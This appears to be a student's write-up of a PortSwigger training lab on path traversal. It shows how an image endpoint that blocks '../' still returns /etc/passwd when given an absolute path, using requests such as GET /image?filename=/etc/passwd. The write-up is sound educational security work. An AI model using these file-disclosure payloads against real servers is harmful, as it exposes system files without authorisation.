# Path Traversal — Traversal sequences blocked with absolute path bypass


**Difficulty:** Practitioner

**Status:** ✅ Solved



## Overview



This lab contains a **Path Traversal** vulnerability in the functionality that displays product images.



The application blocks traversal sequences such as:



```text

../

```



However, it treats the supplied filename as being relative to a default working directory.



The goal is to retrieve the contents of:




```text

/etc/passwd

```



---



## What is the Key Difference?




In the previous lab, we used:



```text

../../../etc/passwd

```



to move up through directories.



In this lab, traversal sequences are blocked, so using `../` is not possible.



Instead, we can try an **Absolute Path**.



---



## Initial Request



When loading a product image, the application sends:



```http

GET /image?filename=29.jpg HTTP/2

```



The important parameter is:



```text

filename=29.jpg

```



This parameter controls which file the application attempts to retrieve.




---



## Absolute Path



An **Absolute Path** specifies the complete path starting from the root directory.



For example:



```text

/etc/passwd

```



The `/` at the beginning represents the root directory.



### Relative vs Absolute Path



```text

Relative Path:

29.jpg



Absolute Path:

/etc/passwd

```



A relative path depends on the current/default working directory, while an absolute path starts from the filesystem 
root.



---



## Exploitation



Since the application blocks traversal sequences such as:




```text

../

```



we bypass the restriction by supplying the target file as an absolute path.


Replace:



```text

filename=29.jpg

```



with:



```text

filename=/etc/passwd

```



The resulting request is:



```http

GET /image?filename=/etc/passwd HTTP/2

```



The application accepts the absolute path and returns the contents of:



```text

/etc/passwd

```



---



## Why Does It Work?



The application attempts to resolve the supplied filename relative to its default working directory.



However, when an **absolute path** is provided, the path starts from the root directory instead of being resolved 
relative to the default directory.



Therefore, we don't need to use:



```text

../

```


at all.



### Attack Flow



```text

User-controlled filename

        ↓

Traversal sequences are blocked

        ↓

Use an absolute path

        ↓

/etc/passwd

        ↓

Access the unintended file

```



---



## Key Takeaways



* Blocking `../` does not necessarily prevent Path Traversal.

* Always consider whether the application accepts **absolute paths**.

* An absolute path starts from the filesystem root `/`.

* The payload does not need traversal sequences when an absolute path is accepted.

* Understanding how the application resolves file paths is more important than memorizing payloads.


## Lab Payload


```text

/etc/passwd

```



**Result:** Retrieved `/etc/passwd` and solved the lab. ✅



## References



* PortSwigger Web Security Academy — Path Traversal
  https://portswigger.net/web-security/file-path-traversal



* OWASP — Path Traversal
  https://owasp.org/www-community/attacks/Path_Traversal
